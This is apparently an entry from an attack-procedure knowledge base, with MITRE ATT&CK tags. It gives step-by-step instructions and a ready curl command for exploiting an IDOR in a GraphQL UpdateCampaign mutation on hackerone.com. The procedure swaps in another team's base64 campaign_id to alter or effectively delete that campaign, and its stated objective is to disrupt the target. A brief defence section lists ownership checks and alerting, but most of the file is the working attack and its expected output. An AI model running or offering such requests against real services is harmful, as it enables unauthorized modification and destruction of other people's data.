---
tags:
  - exploit
  - graphql
  - deletion
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/UpdateCampaign-GraphQL-Mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:48.272Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5ae28964-dd29-4577-8719-038f357d4c41
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-Modified-UpdateCampaign-Request

## Summary

Submit the tampered GraphQL UpdateCampaign mutation with the modified campaign_id to exploit the IDOR, resulting in unauthorized deletion or update of the target campaign.

## Description

With the altered base64 campaign_id, the request bypasses checks, allowing changes like setting disruptive dates or effectively deleting via update (e.g., invalidating access). Impact includes loss of campaign availability for program owners.

## Requirements

1. Original request template with modified campaign_id
2. Valid session cookie
3. Tool to send custom HTTP POST (e.g., curl, Burp Repeater)

## Defense

Defensive measures and detection strategies:

- Add server-side ownership verification: Ensure campaign.team_id matches user.team_id
- Alert on successful updates to foreign campaigns
- Post-fix, expect errors like 'The Campaign does not belong to the team'

## Objectives

1. Execute unauthorized modification
2. Confirm exploitation success
3. Disrupt target campaign

## Instructions

### Step 1: Prepare Tampered Payload

**Context**: Substitute the new campaign_id in the JSON.

Update variables.input.campaign_id to the re-encoded value.

### Step 2: Send the Request

**Context**: Replay via proxy or curl to exploit.

**Command** ([[commands/UpdateCampaign-GraphQL-Mutation]]):
```bash
curl -X POST https://hackerone.com/graphql \
  -H 'Cookie: yourcookie' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":"UpdateCampaign","variables":{"input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzUwMA==","team_id":"...",...}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) { updateCampaign(input: $input) { was_successful ... } }"}'
```

> Expected output: {'data': {'updateCampaign': {'was_successful': true}}}. Verify by checking if target campaign is altered.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/UpdateCampaign-GraphQL-Mutation]]

## Tools Used


## Tags

- exploit
- graphql
